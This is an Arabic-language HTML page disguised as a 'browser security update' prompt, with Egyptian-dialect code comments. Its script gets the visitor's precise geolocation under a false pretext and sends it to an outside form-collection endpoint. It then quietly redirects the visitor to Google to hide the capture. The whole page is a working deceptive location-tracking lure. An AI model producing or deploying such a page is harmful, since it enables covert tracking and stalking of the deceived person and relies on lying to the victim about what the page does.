<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان النظام</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .card { text-align: center; padding: 30px; background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        button { padding: 12px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; width: 100%; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>تحديث أمان المتصفح</h2>
        <p>يرجى السماح بالوصول إلى الموقع الجغرافي للتأكد من هويتك وتحديث إعدادات الأمان.</p>
        <button onclick="getLocation()">تحديث الآن</button>
    </div>

    <script>
        // ده الرابط بتاعك اللي كان في الصورة (Forminit)
        const formUrl = 'https://app.forminit.com/f/nbfj0lhfvfp'; 

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, showError, { enableHighAccuracy: true });
            } else {
                alert("المتصفح لا يدعم هذه الميزة.");
            }
        }

        function sendData(position) {
            const payload = {
                "الخريطة": `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                "الدقة": position.coords.accuracy + " متر"
            };

            fetch(formUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                // هينقله لجوجل بعد ما يسحب اللوكيشن
                window.location.href = "https://www.google.com";
            }).catch(() => {
                window.location.href = "https://www.google.com";
            });
        }

        function showError() {
            alert("عذراً، يجب الموافقة على الصلاحيات لتحديث النظام.");
        }
    </script>
</body>
</html>
